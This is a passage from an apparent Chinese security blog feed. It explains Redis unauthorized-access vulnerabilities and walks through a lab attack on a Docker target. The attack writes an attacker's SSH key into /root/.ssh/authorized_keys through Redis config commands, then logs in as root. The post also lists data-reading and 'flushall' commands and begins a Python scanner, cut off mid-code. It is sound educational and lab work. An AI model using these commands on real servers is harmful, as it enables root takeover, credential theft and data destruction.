<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://nnnpc.github.io</id>
    <title>Hexo • Posts by &#34;其它&#34; category</title>
    <link href="https://nnnpc.github.io" />
    <updated>2024-04-16T05:58:19.057Z</updated>
    <category term="MISC" />
    <category term="流量" />
    <category term="WEB" />
    <category term="渗透" />
    <category term="python" />
    <category term="GO" />
    <category term="其它" />
    <entry>
        <id>https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</id>
        <title>未授权访问漏洞</title>
        <link rel="alternate" href="https://nnnpc.github.io/2024/04/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;blockquote&gt;
&lt;p&gt;未授权访问漏洞可以理解为安全配置、权限认证、授权页面存在缺陷，导致其他用户可以直接访问，从而引发权限可被操作，数据库、网站目录等敏感信息泄露。目前存在未授权访问漏洞的主要服务包括：NFS、Samba、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ZooKeeper、ElasticSearch、Memcache、CouchDB、Docker、Solr、Hadoop 等，使用时要注意。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Redis 未授权访问漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Redis 是一种使用 ANSIC 语言编写的开源 Key-Value 型数据库。与 Memcache 相似，支持存储的 value 类型有很多种，其中包括 String（字符串）、List（链表）、Set（集合）、Zste（有序集合）、Hash（哈希）等。同时，Redis 还支持不同的排序方式。Redis 为了保证效率，将数据缓存在内存中，周期性地把更新的数据写入磁盘或者把修改操作写入追加的记录文件中，，在此基础上实现主从同步。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对 Redis 配置不当将会导致未授权访问漏洞，，从而被攻击者恶意利用。在特定条件下，如果 Redis 以 root 身份运行，攻击者可以用 root 权限的身份写入 SSH 公钥文件，通过 SSH 登录目标服务器。流程如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;密钥验证登录客户端生成公钥和私钥，将公钥提前部署在服务器上。&lt;br&gt;
客户端发起连接请求。&lt;br&gt;
服务器随机生成一个字符串，用本地的公钥加密，发送给客户端。&lt;br&gt;
客户端通过私钥解密，将解密后的字符串发送给服务器。&lt;br&gt;
服务器验证本地字符串和客户端发来的字符串的一致性，如果通过，则认证成功。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;进而会导致服务器权限被获取、泄露或发生加密勒索事件，为正常服务带来严重危害。通常，服务器上的 Redis 绑定在 0.0.0.0:6379，如果没有开启认证功能，且没有采用相关的安全策略，比如添加防火墙规则避免其他非信任来源 IP 访问等，将会导致 Redis 服务直接暴露在公网上，造成其他用户直接在非授权情况下访问 Redis 服务。&lt;/p&gt;
&lt;p&gt;通过手工进行未授权访问验证，在安装 Redis 服务的 Kali 系统中输入&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli-h IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果目标系统存在未授权访问漏洞，则可以成功进行连接。输入 info 命令，可以查看 Redis 服务的版本号、配置文件目录、进程 ID 号等&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ocG69JSA982uSTiK.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞利用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当与远程 Redis 建立好连接后，通过 Redis 指令就能查询所需要的敏感信息。下面就 Redis 一些常用指令进行简单介绍：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;查看key和其对应的值：keys *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;获取用户名：get user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;获取登录指令：get password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;删除所有数据：flushall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PwhMm1LB8LN6UmBp.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果 redis 拥有 root 权限，那么攻击者就可以将自己的公钥写入目标服务器的&lt;br&gt;
 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接登录目标服务器。&lt;/p&gt;
&lt;p&gt;接下来就拉取镜像实现 ssh 登录&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo docker pull medicean/vulapps:r_redis_1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拉取 docker 镜像，并且启动环境&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo docker run --name=redisvul -d -p 22:22 -p 6379:6379 medicean/vulapps:r_redis_1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里由于是 docker 中的镜像，因此只能使用这一台机子来作为攻击机，因为 docker 中生成的一个虚拟网卡只能本机来进行访问，其他机子访问不了，既然本机作为攻击机，就先查看下本机的 ip&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ifconfig&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再查看下 docker 中该容器的 ID&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QbG2DLhu7m9Y4wAk.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里查看到我的容器 ID 为 9a4fe89bc623，接下来查看 docker 的 ip，通过命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo docker exec -it 容器id /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;进入 docker，通过&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/hosts&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来查看 ip&lt;br&gt;
&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4FyPW0dj99ZAYTzU.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样攻击机和靶机的 ip 都知道了，接着就是利用 redis 未授权访问漏洞写入公钥进行连接了&lt;/p&gt;
&lt;p&gt;先同样测试一下 redis&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli -h IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F0hXSvvwMrcrZxf1.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;redis 未授权证明成功，接下来本地生成公钥进行传输&lt;/p&gt;
&lt;p&gt;（建议接下来全程用 root 用户操作，能够减少权限不够的报错）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kTm65oT3FRsBJWTV.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;三个问题直接回车就好，overwrite 是因为我之前进行生成过，询问是否覆盖，公钥生成完毕，将生成的公钥的值写入目标机当中&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(echo -e &amp;quot;\n\n&amp;quot;; cat ~/.ssh/id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; /tmp/foo.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /tmp/foo.txt | redis-cli -h IP -p 6379 -x set crackit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/T7LD5oTxTELJf35U.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;连接目标&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli -h IP -p 6379 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;设置（更改）目录为 /root/.ssh，并将备份文件名设置为 authorized_keys&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config get dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename &amp;quot;authorized_keys&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/F1MA04PS1eh63Dly.png!thumbnail&#34; alt=&#34;&#34; title=&#34;fig:&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后利用私钥通过 ssh 连接目标&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh root@IP -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IX6kmiuiSQKe4Z30.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;连接成功，同样的命令 cat /etc/hosts 查看 ip&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yhbUrod9FGqXnCnE.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;能看到成功 getshell 并且是 root 权限&lt;/p&gt;
&lt;p&gt;这里提一嘴，如果是用两台机子也可以，但有可能会出现虽然能对拉镜像的机子进行 redis 的连接，并且成功写入，但是 ssh 连不上的情况。这是因为 22 端口没进行映射，6379 端口是自动进行映射了，所以到最后一步 ssh 连接才会不成功&lt;/p&gt;
&lt;p&gt;接下来介绍怎么通过 python 脚本批量检测 redis 未授权访问漏洞&lt;/p&gt;
&lt;p&gt;先编写起始部分，类似于 C 语言中的 main () 函数，执行过程中没有发生异常时，执行定义的 start () 函数。通过 sys.argv [] 实现对外部指令的接收。其中，sys.argv [0] 代表代码本身的文件路径，sys.argv [1:] 表示从第一个命令行参数到输入的最后一个命令行参数，存储形式为 List 类型：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                start(sys.argv[1:])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        except KeyboardInterrupt:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                print(&amp;quot;interrupted by user,killing all threads...&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;编写命令行参数处理功能。此处主要应用 getopt.getopt () 函数处理命令行参数，该函数目前有短选项和长选项两种格式。短选项格式为 &amp;quot;-“加上单个字母选项；长选项格式为”–&amp;quot; 加上一个单词选项。opts 为一个两元组列表，每个元素为（选项串，附加参数）。如果没有附加参数则为空串。之后通过 for 循环输出 opts 列表中的数值并赋值给自己定义的变量：&lt;br&gt;
接下来部分主要用于输出帮助信息，增加代码工具的可读性和易用性。为了使输出的信息更加美观简洁，可以通过转义字符设置输出字体的颜色，从而实现需要的效果。开头部分包含三个参数：显示方式、前景色、背景色。这三个参数是可选的，可以只写其中的某一个参数。对于结尾部分，可以省略，但是为了书写规范，建议以 \033 [0m 结尾&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# banner信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def banner():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(&amp;#x27;\033[1;34m#################################################\033[1;32mTT_xxxxx\033[&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#x27;1;34m##############################################################\033[0m\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # 使用规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    def usage():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;-h: --help 帮助;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;-p: --port 端口;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;-u: --url 域名;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;-s: --type Redis&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.exit()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出有关该脚本用法的帮助信息，即可执行的参数指令以及对应的功能简介。当然，此处也可以根据自己的喜好设置输出不同类型的字体颜色或者图案&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def start(argv):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    thread = 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    dict = &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    utl = &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    type = &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if len(sys.argv) &amp;lt; 2:  # 程序外部获取参数的桥梁&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;-h 帮助信息;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.exit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        banner()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        opts, args = getopt.getopt(argv, &amp;#x27;-u:-p:-s:-h&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    except getopt.GetoptError:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;Error an argument!&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sys.exit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for opt, arg in opts:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if opt == &amp;#x27;-u&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            url = arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        elif opt == &amp;#x27;-s&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            type = arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        elif opt == &amp;#x27;-p&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            port = arg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        elif opt == &amp;#x27;-h&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            print(usage())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    launcher(url, type, port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def launcher(url, type, port):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if type == &amp;#x27;Redis&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        output = redis_unathored(url_exec(url), port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        output_exec(output, type)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来就是 redis 未授权访问检测脚本的核心部分，根据命令行输入端写入的 IP 或 IP 范围，通过 for 语句循环输出&lt;br&gt;
。此处通过 socket () 函数尝试连接远程主机的 IP 及端口号，发送 payload 字符串。利用 rcvdata () 函数接收目标主机返回的数据，当时返回的数据含有’redis&lt;br&gt;
version’字符串时，表明存在未授权访问漏洞，否则不存在&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def redis_unathored(url, port):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = 